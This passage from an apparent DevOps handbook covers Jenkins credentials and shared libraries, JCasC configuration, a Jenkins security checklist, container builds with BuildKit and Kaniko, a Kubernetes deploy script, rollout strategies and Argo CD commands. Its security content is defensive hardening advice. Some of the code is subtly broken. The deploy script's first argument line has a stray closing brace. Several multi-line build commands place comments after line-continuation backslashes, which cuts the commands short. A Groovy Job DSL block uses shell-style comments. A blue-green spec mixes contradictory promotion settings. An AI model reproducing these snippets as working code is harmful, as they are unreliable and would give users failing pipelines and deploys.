  sshUserPrivateKey(credentialsId: 'git-ssh', keyFileVariable: 'KEYFILE', usernameVariable: 'SSHUSER'),
  dockerServerRegistry(credentialsId: 'ghcr', registryUrlVariable: 'REG', credentialsIdVariable: 'CID'),
  usernameColonPassword(credentialsId: 'ghcr', variable: 'UP'),
  amazonWebServicesCredentials(credentialsId: 'aws', accessKeyVariable: 'AK', secretKeyVariable: 'SK'),
  // ⭐⭐ Vault:
]) {
  sh '…'                                                  // ⭐ single quotes!
}
withVault(configuration: [vaultUrl: env.VAULT_ADDR, vaultCredentialId: 'approle'],
          vaultSecrets: [[path: 'secret/shop/prod', secretValues: [
            [envVar: 'DB_PASS', vaultKey: 'db_password'],
            [envVar: 'API_KEY', vaultKey: 'api_key']]]]) {
  sh 'psql -c "select 1"'                                 // $DB_PASS is in the env
}
```

### 6.4 Shared libraries — the anatomy

```
pipeline-library/                        ← a Git repo
├── vars/                                ⭐ global variables — the DSL
│   ├── shopPipeline.groovy                 a whole pipeline as a function
│   ├── buildAndPushImage.groovy            a step
│   ├── deployWithGitOps.groovy
│   ├── notifySlack.groovy
│   └── waitForService.groovy
├── src/                                 ⭐ classes, for real logic
│   └── com/shop/ci/
│       ├── Config.groovy                 a typed config object
│       ├── ImageBuilder.groovy
│       └── Promoter.groovy
├── resources/                           ⭐ non-Groovy files
│   ├── pod-templates/hardened.yaml
│   └── scripts/rollback.sh
├── test/                                ⭐ JenkinsPipelineUnit
│   └── groovy/com/shop/ci/ConfigTest.groovy
├── docs/
│   └── shopPipeline.md                  ⭐ generated or hand-written
└── README.md

// ⭐ the CONSUMER:
@Library('shop-shared@v2.4.1') _          // ⭐⭐ a SEMVER TAG, not a branch
//  @Library('shop-shared@main') _        // ⛔ a branch — moves under you
//  @Library('shop-shared@a1b2c3d') _     // ⭐⭐⭐ a SHA — the pinned production way
//  @Library('shop-shared') _             // ⛔ the default version — set in the UI
// ⭐ the trailing `_` is REQUIRED when you don't assign it to a variable.

// vars/shopPipeline.groovy — a whole pipeline in one call
def call(Map config = [:]) {
  def c = new com.shop.ci.Config(config)          // ⭐ validated, typed
  c.validate()                                     // ⭐ fails fast with a good message
  pipeline {
    agent { kubernetes { yaml libraryResource('pod-templates/hardened.yaml') } }
    options { timestamps(); ansiColor('xterm'); timeout(time: c.timeoutMinutes, unit: 'MINUTES') }
    stages {
      stage('Build')  { steps { script { buildAndPushImage(service: c.service) } } }
      stage('Deploy') { when { branch 'main' }
                        steps { script { deployWithGitOps(service: c.service, env: c.environment) } } }
    }
    post { always { notifySlack(channel: c.slackChannel) } }
  }
}
// the consumer's Jenkinsfile becomes ONE LINE:
shopPipeline(service: 'checkout', environment: 'production', timeoutMinutes: 45)

// ⭐⭐ the CONTRACT TEST — every config key must be documented
// test/groovy/com/shop/ci/ConfigTest.groovy  (JenkinsPipelineUnit)
void 'every config key is documented'() {
  def keys = new Config([:]).supportedKeys()
  def docs = new File('docs/shopPipeline.md').text
  keys.each { k -> assert docs.contains("`$k`") : "⛔ config key '$k' is not documented" }
}
void 'an unknown key fails loudly'() {
  shouldFail(IllegalArgumentException) { new Config([servic: 'x']).validate() }
  // ⭐⭐ did-you-mean: "unknown key 'servic' — did you mean 'service'?"
}
// ⭐ and the BREAKING-CHANGE DETECTOR in the library's own CI:
//   diff vars/*.groovy against the previous tag; if a public method signature
//   changed, REQUIRE a major version bump (v2.x → v3.0). Fail the build otherwise.
```

### 6.5 JCasC — Jenkins Configuration as Code

```yaml
# ⭐⭐ EVERY setting in the UI can drift. JCasC puts it in Git.
jenkins:
  systemMessage: "shop CI — managed by JCasC. Do not edit in the UI."
  numExecutors: 0                      # ⭐⭐ ZERO on the controller. Always.
  mode: EXCLUSIVE                      # ⭐ never run jobs on the controller
  labelString: controller
  quietPeriod: 5
  scmCheckoutRetryCount: 2
  slaveAgentPort: 50000
  crumbIssuer:
    standard: {excludeClientIPFromCrumb: false}   # ⭐⭐ CSRF stays ON
  securityRealm:
    local:
      allowsSignup: false              # ⭐⭐ NO self-registration
      users:
        - {id: admin, password: "${JENKINS_ADMIN_PASSWORD}"}
    # ⭐ or LDAP / OIDC:
    # ldap:
    #   configurations:
    #     - server: ldaps://ldap.shop.example.com
    #       rootDN: 'dc=shop,dc=example,dc=com'
    #       userSearchBase: 'ou=people'
    #       userSearch: 'uid={0}'
    #       groupSearchBase: 'ou=groups'
    #       inhibitInferRootDN: true
    #       disableMailAddressResolver: false
    #       timeout: 30s
  authorizationStrategy:
    roleBased:
      roles:
        global:
          - name: admin
            permissions: [Overall/Administer]
            entries: [{user: admin}]
          - name: developer
            permissions: [Overall/Read, Job/Read, Job/Build, Job/Cancel, Job/Workspace]
            entries: [{group: developers}]
          - name: anonymous
            permissions: []            # ⭐⭐ nothing
        items:
          - name: production
            pattern: "shop/production/.*"
            permissions: [Job/Read, Job/Build, Job/Configure, Credentials/View]
            entries: [{group: sre-team}]
          - name: read-only
            pattern: ".*"
            permissions: [Job/Read]
            entries: [{group: developers}]
  remotingSecurity: {enabled: true}    # ⭐⭐ Agent→Controller access control
  clouds:
    - kubernetes:
        name: kubernetes
        serverUrl: "https://kubernetes.default"
        namespace: jenkins
        jenkinsUrl: "http://jenkins.jenkins.svc.cluster.local:8080"
        jenkinsTunnel: "jenkins-agent.jenkins.svc.cluster.local:50000"
        containerCapStr: "30"
        maxRequestsPerHostStr: "32"
        retentionTimeout: 300
        waitForPodSec: 600
        templates:
          - name: shop-hardened
            label: shop-agent
            nodeUsageMode: EXCLUSIVE
            serviceAccount: jenkins-agent     # ⭐ NOT the controller's SA
            idleMinutes: 0                    # ⭐⭐ destroy immediately
            podRetention: never               # ⭐⭐ never keep a pod
            alwaysPullImage: true             # ⭐⭐ always pull — no stale layers
            activeDeadlineSeconds: 300
            yaml: |
              apiVersion: v1
              kind: Pod
              spec:
                automountServiceAccountToken: false
                securityContext: {runAsNonRoot: true, runAsUser: 10001}
                containers:
                  - name: tools
                    image: ghcr.io/3558bhk/ci-tools:1.4.0@sha256:…
                    command: [sleep]
                    args: [infinity]
                    securityContext: {allowPrivilegeEscalation: false, capabilities: {drop: [ALL]}}
                    resources: {requests: {cpu: 500m, memory: 1Gi}, limits: {memory: 3Gi}}
  nodes: []                            # ⭐ no static agents — everything is ephemeral

security:
  globalJobDslSecurityConfiguration:
    useScriptSecurity: true            # ⭐⭐ sandbox the Job DSL
  scriptApproval:
    approvedSignatures: []             # ⭐ nothing pre-approved; require review
  # ⭐⭐ Agent → Controller access control (the "remoting security" allowlist)
  # Manage Jenkins → Security → Agents
  #   ⛔ NEVER grant: File path restrictions off, or "All" commands.
  #   ⭐ Grant only: the workspace directory, and nothing else.

credentials:
  system:
    domainCredentials:
      - credentials:
          - usernamePassword:
              scope: SYSTEM                       # ⭐⭐ SYSTEM, not GLOBAL
              id: ghcr-token
              username: 3558bhk
              password: "${GHCR_PAT}"
              description: "GHCR push (non-production)"
          - string:
              scope: SYSTEM
              id: config-repo-app-token
              secret: "${CONFIG_REPO_TOKEN}"
              description: "the shop-config promoter token"
# ⭐⭐ FOLDER-SCOPED CREDENTIALS: production secrets live in a nested folder,
#    so a job in another folder literally cannot see them.
#    Folder: shop/production/ → Credentials → Add → scope: this folder only.

unclassified:
  location:
    adminAddress: platform@shop.example.com
    url: https://jenkins.shop.example.com          # ⭐⭐ REQUIRED or links break
  timestamper:
    allPipelines: true
    systemTimeFormat: "'<b>'yyyy-MM-dd HH:mm:ss.SSS'</b> '"
  buildDiscarders:
    configuredBuildDiscarders:
      - simpleBuildDiscarder:
          discarder: {logRotator: {daysToKeepStr: '180', numToKeepStr: '100',
                                   artifactNumToKeepStr: '20'}}
  pollSCM: {pollingSchedule: 'H/5 * * * *'}
  gitSCM:
    createAccountBasedOnEmail: false
    useExistingAccountWithSameEmail: false
  slack:
    teamDomain: shop
    tokenCredentialId: slack-token
    room: '#shop-ci'
    sendAsText: false
  prometheus:                                          # ⭐ Jenkins' own metrics
    path: prometheus
    defaultNamespace: jenkins
    useAuthenticatedEndpoint: true
    useJobName: true
    appendParamLabel: true
    countAbortedBuilds: true
    countFailedBuilds: true
    countNotBuiltBuilds: true
    countSuccessfulBuilds: true
    countUnstableBuilds: true
    processingDisabledBuilds: false
    fetchTestResults: true
  themeManager:
    theme: dark
  authorizeProject:                                    # ⭐⭐ WHO a build runs as
    strategy:
      - triggeringUsersAuthorizationStrategy: {}       # ⭐ run as the triggering user
      # ⛔ NEVER: 'systemAuthorizationStrategy' for PR-triggered builds
  globalLibraries:
    libraries:
      - name: shop-shared
        defaultVersion: "v2.4.1"
        implicit: false                                # ⭐ require an explicit @Library
        retriever:
          modernSCM:
            scm:
              github:
                repoOwner: 3558Bhk
                repository: pipeline-library
                traits:
                  - gitHubBranchDiscovery: {strategyId: 1}     # ⭐ only named branches
                  - gitHubTagDiscovery: {}                     # ⭐ and tags

jobs:
  - script: >
      multibranchPipelineJob('shop/main') {
        branchSources {
          github {
            repoOwner('3558Bhk'); repository('shop')
            traits {
              originPullRequestDiscoveryTrait { strategyId(1) }   # ⭐ merge commit
              forkPullRequestDiscoveryTrait {                   # ⭐⭐ FORK PRs
                strategyId(2)                                     // discover them, but…
                trust(class: 'jenkins.scm.impl.trustNobody')      // ⭐⭐⭐ trust NOTHING
              }
              headWildcardFilter { includes('main release/*'); excludes('feature/experimental/*') }
              cloneOptionTrait { extension { shallow(false) noTags(false) honorRefspec(false) timeout(20) } }
            }
          }
        }
        orphanedItemStrategy { discardOldItems { numToKeep(30); daysToKeep(90) } }
        configure {
          it.properties.removeIf { p -> p.getClass().name.contains('BranchJobProperty') }
        }
      }
  - file: /var/jenkins_home/jobs/*.xml

tool:
  maven:
    installations: [{name: maven-3.9, properties: [{installSource: {installers: [{maven: {id: '3.9.9'}}]}}]}]
  jdk:
    installations: [{name: temurin-21, properties: [{installSource: {installers: [{jdk: {id: '21'}}]}}]}]
  git: {installations: [{name: Default, home: git}]}
```

```bash
# ⭐ the two JCasC workflows you must have:
# 1. VALIDATE in CI before applying
curl -sf -XPOST -u admin:$TOKEN -H "$CRUMB" \
  --data-binary @casc.yaml \
  "$JENKINS_URL/configuration-as-code/check"
# ⭐ 2. DETECT UI DRIFT — monthly
curl -sf -u admin:$TOKEN "$JENKINS_URL/configuration-as-code/export" > /tmp/current.yaml
diff <(yq -P 'sort_keys(..)' casc.yaml) <(yq -P 'sort_keys(..)' /tmp/current.yaml)
#   ⭐ if the diff is non-empty, someone changed something in the UI.
#      Either fold it into Git or revert it in the UI. NEVER leave it.
```

### 6.6 Jenkins security canon ⭐⭐

```
CONTROLLER
  □ numExecutors: 0 and mode: EXCLUSIVE     ← nothing ever runs on the controller
  □ a dedicated, non-root, containerised controller
  □ the PVC backed up nightly, READ-ONLY mounted for the backup job
  □ JCasC for every setting + a monthly /export diff
  □ a BAKED controller image (JCasC + plugins + their versions) so a rebuild
    takes 10 minutes ← ⭐ this IS the HA story. Jenkins has NO HA.

AUTHENTICATION AND AUTHORIZATION
  □ signup DISABLED (allowsSignup: false)
  □ CSRF protection ON (never disabled "to fix a plugin")
  □ LDAP/OIDC, not the local realm, for humans
  □ Role Strategy: admins, developers (read/build), sre-team (production folder)
  □ ⭐ authorize-project: buildAsUser, NOT the SYSTEM user
       — otherwise a PR from a fork runs with the SYSTEM user's credentials
  □ Agent → Controller access control: the allowlist, not "All"
  □ ⭐⭐ THE SCRIPT CONSOLE OWNS EVERY SECRET IN THE INSTANCE.
       Restrict it to a named break-glass group. Log every use. It is not
       "admin tooling", it is "root on every job".

CREDENTIALS
  □ FOLDER-SCOPED. Production credentials live in shop/production/.
  □ a job in shop/dev/ CANNOT SEE a production credential. Test this.
  □ ⭐ no long-lived cloud keys — use the OIDC provider plugin, or Vault
  □ rotate anything that ever lived in a Jenkinsfile or a job config
  □ `credentialsBinding` in the Script Console audit: who read what, when

MULTIBRANCH AND FORK PRs
  □ ⭐⭐⭐ trustNobody() on the forkPullRequestDiscoveryTrait
       — otherwise a fork's Jenkinsfile runs with YOUR credentials
  □ a separate multibranch source for forks with a different credential set
  □ `when { not { changeRequest() } }` before anything with credentials

AGENTS
  □ ephemeral Kubernetes pods, idleMinutes: 0, podRetention: never
  □ alwaysPullImage: true
  □ automountServiceAccountToken: false
  □ a dedicated serviceAccountName with NO cluster RBAC
  □ ⭐⭐ NO docker.sock. Kaniko or BuildKit rootless. Ever.
  □ readOnlyRootFilesystem where possible; emptyDir for /tmp and the workspace
  □ a bounded workspace (cleanWs in post) so a pod can't fill the node's disk

PLUGINS
  □ an inventory: plugin, version, last-used-by, maintainer status
  □ only install plugins you can name a reason for
  □ update on a schedule, in a staging instance first
  □ ⭐ a plugin is Groovy running with FULL Jenkins privileges. A malicious or
       abandoned plugin is a worse supply-chain risk than a malicious action.
  □ remove, don't disable

PIPELINES
  □ ⭐ single-quoted `sh` for anything untrusted; withEnv for the values
  □ no `evaluate()`, no `GroovyShell`, no dynamic script loading
  □ shared libraries PINNED to a tag in dev and a SHA in production
  □ the Job DSL under script security
  □ `timeout()` on every pipeline — a hung build holds an agent forever
```

---

<a name="7--docker-and-container-builds"></a>
## 7 · Docker and container builds

### 7.1 The three build engines

| | 🐳 Docker/BuildKit | 🐙 `docker/build-push-action` | 🥫 Kaniko |
|---|---|---|---|
| Where | anywhere with the daemon | a GitHub runner | ⭐ any Kubernetes pod |
| Needs a daemon | yes | yes (or BuildKit) | ⭐ **no** |
| Needs privileges | yes (or rootless) | yes | ⭐ **no** |
| In a pod | ⛔ needs docker.sock | ⛔ | ✅ |
| Cache | local layers + registry | ⭐ GHA cache + registry | registry only |
| SBOM | `--sbom` | `sbom: true` | `--sbom` |
| Provenance | `--provenance` | `provenance: mode=max` | ⚠️ limited |
| Reproducible | `--build-arg SOURCE_DATE_EPOCH` | same | ⭐ `--reproducible` |
| Multi-arch | `--platform` | `platforms:` | ⚠️ one arch per run |

```bash
# ── BuildKit ────────────────────────────────────────────────────
export DOCKER_BUILDKIT=1                    # ⭐ default in Docker 23+
docker buildx create --name shop --driver docker-container --use
docker buildx inspect --bootstrap
docker buildx ls
docker buildx build apps/shop-api \
  --tag ghcr.io/3558bhk/shop-api:$SHA \
  --tag ghcr.io/3558bhk/shop-api:latest \
  --platform linux/amd64,linux/arm64 \      # ⭐ multi-arch in ONE command
  --cache-from type=registry,ref=ghcr.io/3558bhk/shop-api:buildcache \
  --cache-to   type=registry,ref=ghcr.io/3558bhk/shop-api:buildcache,mode=max \
  --provenance=mode=max \                   # ⭐ SLSA provenance
  --sbom=true \                             # ⭐ an SBOM in the image index
  --attest type=sbom,generator=docker/scout-sbom-indexer:1 \
  --metadata-file build-metadata.json \     # ⭐⭐ the digest is in here
  --build-arg SOURCE_DATE_EPOCH=$(git log -1 --format=%ct) \   # ⭐ reproducible
  --label org.opencontainers.image.revision=$SHA \
  --label org.opencontainers.image.source=$GIT_URL \
  --label org.opencontainers.image.created=$(date -u +%FT%TZ) \
  --push                                    # or --load for a single-arch local image
DIGEST=$(jq -r '."containerimage.digest"' build-metadata.json)
echo "  ✅ $DIGEST"
docker buildx imagetools inspect ghcr.io/3558bhk/shop-api@$DIGEST
docker buildx prune --all --force           # ⭐ when the cache goes wrong
docker buildx use default                   # ⭐ go back to the classic builder

# ⭐ the Dockerfile flags that matter for CI:
#   COPY --link           ⭐ a cache-friendly layer that doesn't invalidate parents
#   COPY --exclude=x      (BuildKit 1.19+)
#   COPY --parents        (BuildKit 1.20+)
#   COPY --checksum=sha256:…   (BuildKit 1.6+) ⭐⭐ pin a remote file
#   COPY --chmod=755      (BuildKit 1.2+)
#   RUN --mount=type=cache,target=/root/.m2      ⭐⭐ the dependency cache
#   RUN --mount=type=secret,id=token             ⭐ a secret that is NOT a layer
#   RUN --mount=type=ssh                         ⭐ agent forwarding, no key in the image
#   FROM … AS builder / COPY --from=builder      ⭐ multi-stage

# ── Kaniko (the Kubernetes-native build) ────────────────────────
/kaniko/executor \
  --context "dir://$WORKSPACE/apps/shop-api" \        # ⭐ or git://, s3://, tar://
  --dockerfile "$WORKSPACE/apps/shop-api/Dockerfile" \
  --destination "ghcr.io/3558bhk/shop-api:$SHA" \
  --cache=true \
  --cache-repo=ghcr.io/3558bhk/shop-api-cache \       # ⭐⭐ a SEPARATE repo for the cache
  --cache-ttl=168h \
  --cache-copy-layers=true \
  --compressed-caching=false \                        # ⭐ safer with big layers
  --sbom=cyclonedx --sbom-dir=/sbom \
  --reproducible \                                    # ⭐ strips timestamps
  --skip-unused-stages=true \
  --use-new-run \
  --verbosity=info \
  --label org.opencontainers.image.revision=$SHA \
  --snapshot-mode=redo \                              # ⭐ faster than the default
  --push-retry=3 \
  --image-fs-extract-retry=3
# ⭐ the registry auth: /kaniko/.docker/config.json
mkdir -p /kaniko/.docker
printf '{"auths":{"ghcr.io":{"auth":"%s"}}}' \
  "$(printf '%s:%s' "$U" "$P" | base64 -w0)" > /kaniko/.docker/config.json
# ⭐⭐ NEVER mount /var/run/docker.sock to get Kaniko working. That is the whole
#    point of Kaniko.

# ── BuildKit rootless (the third option) ────────────────────────
buildkitd --config /etc/buildkit/buildkitd.toml &     # as a non-root user
buildctl build --frontend dockerfile.v0 --local context=. --local dockerfile=. \
  --output type=image,name=$IMAGE,push=true
# ⭐ needs /dev/fuse and user namespaces — a seccomp/AppArmor exception, but no
#    root and no docker.sock.

# ── the tools you'll use around the image ───────────────────────
crane digest $IMAGE:$TAG                  # ⭐ the digest without pulling
crane ls $IMAGE                           # list the tags
crane manifest $IMAGE@$DIGEST | jq
crane config $IMAGE@$DIGEST | jq '.config.Labels'
crane copy $SRC $DST                      # ⭐⭐ promote WITHOUT rebuilding
crane export $IMAGE - | tar t             # list the filesystem
crane auth login ghcr.io -u $U -p $P
skopeo inspect --raw docker://$IMAGE@$DIGEST | jq
skopeo copy docker://$SRC docker://$DST --all
regctl image manifest $IMAGE@$DIGEST
# ⭐ scanning
trivy image --severity CRITICAL,HIGH --ignore-unfixed --exit-code 1 $IMAGE@$DIGEST
trivy image --format json --output report.json $IMAGE
trivy sbom --severity CRITICAL sbom.cdx.json         # ⭐ scan the SBOM, not the image
trivy fs --scanners secret,misconfig .               # ⭐⭐ secrets in the repo!
trivy config helm/                                   # the manifests
trivy k8s --report all cluster                        # the whole cluster
grype $IMAGE
syft $IMAGE -o cyclonedx-json=sbom.cdx.json          # ⭐ the SBOM generator
syft $IMAGE -o spdx-json=sbom.spdx.json
```

### 7.2 Build once, promote by digest ⭐⭐

```bash
# THE PATTERN. Learn it once, use it in all three tools.

# ── CI builds and pushes, ONCE ─────────────────────────────────
docker buildx build apps/shop-api \
  --tag ghcr.io/3558bhk/shop-api:$SHA \
  --provenance=mode=max --sbom=true \
  --metadata-file meta.json --push
DIGEST=$(jq -r '."containerimage.digest"' meta.json)

# ── the promotion writes the DIGEST to Git ─────────────────────
./scripts/promote.sh staging shop-api "$DIGEST" --revision "$SHA" --tool github-actions

# ── the deploy uses ONLY the digest ────────────────────────────
helm upgrade --install shop-api apps/base \
  --namespace shop-staging \
  --values environments/staging/values-staging.yaml \
  --set image.repository=ghcr.io/3558bhk/shop-api \
  --set image.digest="$DIGEST" \
  --atomic --timeout 10m --wait

# ⭐⭐ WHY:
#   1. The bytes that ran in dev are EXACTLY the bytes that run in production.
#   2. A tag is mutable. `:latest` at 10:00 and `:latest` at 14:00 can differ.
#      A digest is content-addressed and cannot change.
#   3. Rollback is trivial: write the previous digest back to Git.
#   4. The audit trail is a git log of a one-line diff.
# ⛔ ANTI-PATTERN: rebuilding the image per environment "with different config".
#   That is what ConfigMaps, env vars and Helm values are for. If the image
#   differs per environment, you have not tested what you ship.
```

---

<a name="8--kubernetes-deployment-"></a>
## 8 · Kubernetes deployment

### 8.1 The deploy script (tool-agnostic)

```bash
# scripts/deploy.sh — ⭐⭐ THE SAME SCRIPT, THREE CALLERS
#!/usr/bin/env bash
# usage: deploy.sh <environment> <service> <image-with-digest>
set -euo pipefail

ENVIRONMENT="${1:?usage: deploy.sh <env> <service> <image>}"}
SERVICE="${2:?}"
IMAGE="${3:?}"

NS="shop$([[ "$ENVIRONMENT" == "dev" ]] && echo "-dev"; [[ "$ENVIRONMENT" == "staging" ]] && echo "-staging")"
ATOMIC=true; TIMEOUT=10m
[[ "$ENVIRONMENT" == "production" ]] && TIMEOUT=20m
DRY_RUN="${DRY_RUN:-false}"

log() { printf '\033[1;34m==> %s\033[0m\n' "$*"; }
die() { printf '\033[1;31m⛔ %s\033[0m\n' "$*" >&2; exit 1; }

# ── 1. validate ─────────────────────────────────────────────────
[[ "$IMAGE" == *"@sha256:"* ]] || die "⛔ $IMAGE is not a digest reference. Refusing to deploy a mutable tag."
command -v helm >/dev/null || die "helm is not installed"
command -v kubectl >/dev/null || die "kubectl is not installed"
kubectl cluster-info >/dev/null 2>&1 || die "cannot reach the cluster"

# ── 2. ⭐ the production gate ───────────────────────────────────
if [[ "$ENVIRONMENT" == "production" ]]; then
  log "running the production gate"
  ./scripts/production-gate.sh || die "⛔ the production gate refused the deploy"
fi

# ── 3. render and validate BEFORE touching the cluster ──────────
log "rendering"
helm template "$SERVICE" apps/base \
  --namespace "$NS" \
  --values "environments/$ENVIRONMENT/values-$ENVIRONMENT.yaml" \
  --set image.repository="${IMAGE%@*}" \
  --set image.digest="${IMAGE##*@}" \
  --set revision="${GIT_COMMIT:-unknown}" \
  > /tmp/rendered.yaml
kubeconform -strict -summary /tmp/rendered.yaml || die "⛔ the rendered manifests are invalid"
helm lint apps/base --values "environments/$ENVIRONMENT/values-$ENVIRONMENT.yaml" || die "⛔ lint failed"

if [[ "$DRY_RUN" == "true" ]]; then
  log "DRY_RUN=true — stopping here"; cat /tmp/rendered.yaml; exit 0
fi

# ── 4. ⭐⭐ deploy with --atomic --wait ─────────────────────────
log "deploying $SERVICE to $ENVIRONMENT"
if helm upgrade --install "$SERVICE" apps/base \
    --namespace "$NS" \
    --create-namespace \
    --values "environments/$ENVIRONMENT/values-$ENVIRONMENT.yaml" \
    --set image.repository="${IMAGE%@*}" \
    --set image.digest="${IMAGE##*@}" \
    --set revision="${GIT_COMMIT:-unknown}" \
    --atomic --timeout "$TIMEOUT" --wait --wait-for-jobs \
    --history-max 20 ; then
  log "  ✅ deployed"
else
  # ⭐ --atomic already rolled back. Report WHY.
  log "  ⛔ the deploy failed and was rolled back automatically"
  kubectl -n "$NS" describe rollout "$SERVICE" 2>/dev/null | tail -30 || true
  kubectl -n "$NS" get events --sort-by=.lastTimestamp | tail -20 || true
  kubectl -n "$NS" get pods -l "app.kubernetes.io/name=$SERVICE" -o wide || true
  kubectl -n "$NS" logs -l "app.kubernetes.io/name=$SERVICE" --tail=50 --all-containers || true
  die "the deployment failed — see above"
fi

# ── 5. verify ───────────────────────────────────────────────────
log "verifying"
kubectl -n "$NS" get rollout "$SERVICE" -o jsonpath='{.status.phase}{"\n"}' 2>/dev/null || true
kubectl -n "$NS" get pods -l "app.kubernetes.io/name=$SERVICE" -o wide
./scripts/smoke-test.sh "$NS" "$SERVICE" || die "⛔ the smoke test failed"

# ── 6. record ───────────────────────────────────────────────────
log "recording the deployment"
kubectl -n "$NS" annotate rollout "$SERVICE" \
  shop.example.com/deployed-by="${CI_TOOL:-unknown}" \
  shop.example.com/deployed-at="$(date -u +%FT%TZ)" \
  shop.example.com/deployed-digest="${IMAGE##*@}" --overwrite
```

### 8.2 Deployment strategies

```yaml
# ── ROLLING UPDATE (the default; the one you should get right) ──
spec:
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxUnavailable: 0          # ⭐⭐ NEVER take capacity away
      maxSurge: 1                # ⭐ add one, wait for it, then remove one
# ⭐ and the pod MUST support it:
      containers:
        - lifecycle:
            preStop:
              exec: {command: ["/bin/sh", "-c", "sleep 10"]}   # ⭐⭐ drain
          readinessProbe:
            httpGet: {path: /ready, port: 8080}
            initialDelaySeconds: 0        # ⭐ the startupProbe handles the cold start
            periodSeconds: 5
            failureThreshold: 3
          startupProbe:                   # ⭐⭐ for slow starters (JVM!)
            httpGet: {path: /ready, port: 8080}
            failureThreshold: 60
            periodSeconds: 3              # ← up to 3 minutes to start
          livenessProbe:
            httpGet: {path: /health, port: 8080}
            periodSeconds: 10
            failureThreshold: 6
      terminationGracePeriodSeconds: 45   # ⭐ > preStop + in-flight request time
# ⭐ WHY preStop sleep: the endpoint removal and the SIGTERM race. Without it,
#   the pod gets SIGTERM while it's still in the Service's endpoint list, and
#   in-flight requests are dropped. sleep 10 lets the endpoints settle first.

# ── BLUE-GREEN ──────────────────────────────────────────────────
# Two Deployments (blue/green) behind ONE Service; switch the selector.
apiVersion: argoproj.io/v1alpha1
kind: Rollout
spec:
  strategy:
    blueGreen:
      activeService:  shop-api-active     # ⭐ what the ingress points at
      previewService: shop-api-preview    # ⭐ test the new version privately
      autoPromotionEnabled: false         # ⭐⭐ a human promotes
      scaleDownDelaySeconds: 3600         # ⭐ keep the old ReplicaSet warm for an hour
      prePromotionAnalysis:               # ⭐ analyse BEFORE switching traffic
        templates: [{templateName: shop-canary-check}]
        startingStep: 1
      postPromotionAnalysis:              # ⭐ and after
        templates: [{templateName: shop-canary-check}]
      autoPromotionSeconds: 3600          # ⭐ or auto-promote after an hour
# ⭐ instant rollback: switch the selector back. Zero downtime.
# ⛔ costs 2× the resources during the transition.

# ── CANARY (Argo Rollouts) ──────────────────────────────────────
spec:
  strategy:
    canary:
      canaryService: shop-api-canary
      stableService: shop-api-stable
      trafficRouting:
        nginx: {stableIngress: shop-api}      # or istio / smi / alb / ambassador
      steps:
        - setWeight: 5
        - pause: {duration: 10m}
        - analysis: {templates: [{templateName: shop-canary-check}]}
        - setWeight: 15
        - pause: {}                          # ⭐ an INDEFINITE pause — a human promotes
        - setWeight: 50
        - pause: {duration: 30m}
        - analysis: {templates: [{templateName: shop-canary-check}]}
        - setWeight: 100
      analysis:
        templates: [{templateName: shop-canary-check}]
        startingStep: 2                       # ⭐ don't analyse at 5%
        args: [{name: service, value: shop-api}]
# ⭐ AUTOMATIC ROLLBACK when the analysis fails. That's the whole point.

# ── SHADOW / MIRROR (test with real traffic, no user impact) ────
# Istio VirtualService:
spec:
  http:
    - route:
        - destination: {host: shop-api, subset: v1}
          weight: 100
        - destination: {host: shop-api, subset: v2}
          weight: 0
      mirror: {host: shop-api, subset: v2}    # ⭐⭐ copies requests to v2
      mirrorPercentage: {value: 10.0}
# ⚠️ v2 sees the traffic but its responses are DISCARDED. Only for idempotent
#   GETs unless you handle double-writes.
```

```bash
# ── the kubectl/helm commands ───────────────────────────────────
helm upgrade --install X CHART -n NS --values v.yaml \
  --atomic --timeout 10m --wait --wait-for-jobs \
  --history-max 20 --create-namespace --dry-run=client --debug
helm list -A
helm history X -n NS
helm rollback X <REV> -n NS               # ⭐ instant, from the stored release
helm get values X -n NS                   # what was actually applied
helm get manifest X -n NS
helm template X CHART --values v.yaml | kubeconform -strict -summary -
helm diff upgrade X CHART -n NS --values v.yaml    # ⭐⭐ the helm-diff plugin
helm lint CHART --strict
helm package CHART -d dist/
helm push dist/x-1.0.0.tgz oci://ghcr.io/3558bhk/charts

kubectl -n NS rollout status deploy/X --timeout=300s
kubectl -n NS rollout history deploy/X
kubectl -n NS rollout undo deploy/X --to-revision=2
kubectl -n NS rollout restart deploy/X          # ⭐ a clean restart, no config change
kubectl -n NS rollout pause deploy/X && kubectl -n NS rollout resume deploy/X
kubectl -n NS set image deploy/X c=$IMAGE@$DIGEST
kubectl -n NS scale deploy/X --replicas=5
kubectl -n NS get pods -l app=X -o wide
kubectl -n NS describe pod POD | sed -n '/Events/,$p'
kubectl -n NS logs POD --tail=200 --previous --all-containers
kubectl -n NS logs -l app=X --tail=100 -f --max-log-requests=10
kubectl -n NS get events --sort-by=.lastTimestamp | tail -30
kubectl -n NS exec -it POD -c C -- sh
kubectl -n NS port-forward svc/X 8080:80
kubectl -n NS top pods
kubectl get nodes -o wide && kubectl describe node NODE | sed -n '/Conditions/,/Addresses/p'
kubectl -n NS get pvc && kubectl -n NS describe pvc PVC
kubectl -n NS get hpa && kubectl -n NS describe hpa HPA
kubectl -n NS get pdb
kubectl api-resources --verbs=list --namespaced -o name | xargs -n1 kubectl -n NS get --show-kind --ignore-not-found
kubectl explain rollout.spec.strategy.canary.steps --recursive
kubectl diff -f manifest.yaml
kubectl apply --server-side --force-conflicts -f manifest.yaml
kubectl auth can-i --list -n NS
kubectl auth can-i create pods --as=system:serviceaccount:jenkins:jenkins-agent -n shop
```

---

<a name="9--gitops--argo-cd--argo-rollouts"></a>
## 9 · GitOps · Argo CD · Argo Rollouts

### 9.1 The `argocd` CLI

```bash
argocd login argocd.shop.example.com --grpc-web --sso
argocd login localhost:8880 --plaintext --insecure -u admin -p "$PW"
argocd account get-user-info
argocd account update-password
argocd account generate-token --account admin --id ci-token
argocd context                                    # list the logged-in servers
argocd app list -o wide
argocd app list -p shop-production -l 'shop.example.com/service=checkout'
argocd app get shop-production-checkout --refresh          # ⭐ force a repo refresh
argocd app get shop-production-checkout --hard-refresh     # ⭐⭐ clear the manifest cache
argocd app diff shop-production-checkout                   # ⭐⭐ THE command
argocd app diff shop-production-checkout --exit-code       # 0 = no diff
argocd app manifests shop-production-checkout              # what WOULD be applied
argocd app resources shop-production-checkout
argocd app history shop-production-checkout
argocd app sync shop-production-checkout --prune --timeout 900 \
  --strategy Apply --force --retry-limit 3 --retry-backoff-duration 10s
argocd app sync --project shop-production --prune          # ⭐ sync a whole project
argocd app wait shop-production-checkout --health --sync --timeout 900
argocd app rollback shop-production-checkout 12            # ⭐ to a history ID
argocd app terminate-op shop-production-checkout           # ⭐ kill a stuck sync
argocd app actions list shop-production-checkout           # ⭐ e.g. rollout restart
